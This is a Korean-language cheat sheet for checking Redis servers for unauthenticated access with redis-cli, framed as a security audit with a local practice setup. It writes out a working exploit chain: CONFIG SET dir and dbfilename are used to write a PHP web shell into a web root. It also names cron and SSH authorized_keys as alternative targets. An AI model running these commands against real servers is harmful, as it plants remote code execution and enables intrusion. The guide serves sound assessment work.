# redis-cli 미인증 접근 점검

- redis-cli — Redis 서버 클라이언트. 6379 포트에서 열린 Redis에 인증 없이 접근 가능한지 확인하고 서버 설정·키·파일 쓰기 경로를 점검하는 데 쓴다.
- nmap 등으로 6379/tcp가 열려 있을 때 첫 접속 점검, requirepass 누락 확인, CONFIG SET dir 기반 파일 쓰기(RDB 덤프) 가능 여부 확인할 때.
- apt install redis-tools(redis-cli 포함). Windows는 workspace\services\redis-windows-x64 포터블(Redis 5.x)로 로컬 실습 가능.

## 기본 명령어 구조

```bash
redis-cli -h HOST -p 6379 [명령]
```

## 미인증 접근 점검 절차

```bash
# 1. 응답 확인 - PONG이 오면 인증 없이 접근 가능
redis-cli -h 10.10.10.10 -p 6379 ping

# 2. 인증 요구 여부 - NOAUTH 에러가 오면 인증 필요
redis-cli -h 10.10.10.10 INFO

# 3. 서버·설정 열거
redis-cli -h 10.10.10.10 INFO server
redis-cli -h 10.10.10.10 CONFIG GET '*'

# 4. 키 덤프
redis-cli -h 10.10.10.10 --scan --pattern '*'
redis-cli -h 10.10.10.10 KEYS '*'        # 운영 서버 성능 주의
```

- ping에 PONG이 오고 INFO·CONFIG가 정상 응답하면 미인증 접근 확정이다.
- CONFIG GET requirepass가 빈 문자열이면 인증이 없는 상태라는 원인 확인이 된다.

## CONFIG GET * 확인 항목

```text
requirepass    # 인증 설정 여부 (빈 값 = 미인증 허용)
dir            # RDB 덤프 저장 디렉터리
dbfilename     # 덤프 파일명
bind           # 접속 허용 주소 (0.0.0.0이면 외부 노출)
```

## CONFIG SET dir 파일 쓰기 원리 (점검 관점)

```bash
redis-cli -h 10.10.10.10 CONFIG SET dir /var/www/html/
redis-cli -h 10.10.10.10 CONFIG SET dbfilename shell.php
redis-cli -h 10.10.10.10 SET payload '<?php system($_GET["c"]); ?>'
redis-cli -h 10.10.10.10 SAVE
```

- Redis가 쓰기 권한을 갖고 dir 변경이 허용되면 RDB 덤프를 원하는 경로에 쓰는 경로가 생긴다.
- 웹루트가 없으면 /etc/cron.d나 ~/.ssh/authorized_keys가 대안 경로가 된다(리눅스).
- 점검에서는 CONFIG SET dir를 쓸 수 있는지만 확인하고 원값으로 복구하는 수준으로 제한한다. CONFIG SET은 미인증 Redis에서 허용되는 경우가 많아 이 경로 자체가 finding이 된다.

## 인증이 걸려 있을 때

```bash
redis-cli -h 10.10.10.10 -a password INFO

# 대화형에서 AUTH
redis-cli -h 10.10.10.10
> AUTH password
```

## Windows 포터블

```bash
workspace\services\redis-windows-x64\redis-server.exe
workspace\services\redis-windows-x64\redis-cli.exe -h 127.0.0.1
```

- redis-windows-x64는 Redis 5.x 포터블 빌드다. 로컬 서버를 띄워 미인증 점검 절차와 CONFIG SET 동작을 그대로 연습할 수 있다.

## 팁·트러블슈팅

- nmap에서 6379 open으로 나와도 Redis가 아닌 서비스일 수 있다. ping 응답으로 판정한다.
- KEYS *는 키가 많은 서버를 멈추게 할 수 있다. 점검 덤프는 --scan을 쓴다.
- Redis 6 이상은 ACL이 적용될 수 있다. CONFIG GET users에서 default 사용자가 off면 미인증 차단 상태다.
- 점검 중 CONFIG SET dir를 바꿨다면 CONFIG SET dir <원값>과 CONFIG SET dbfilename dump.rdb 복구를 잊지 않는다.
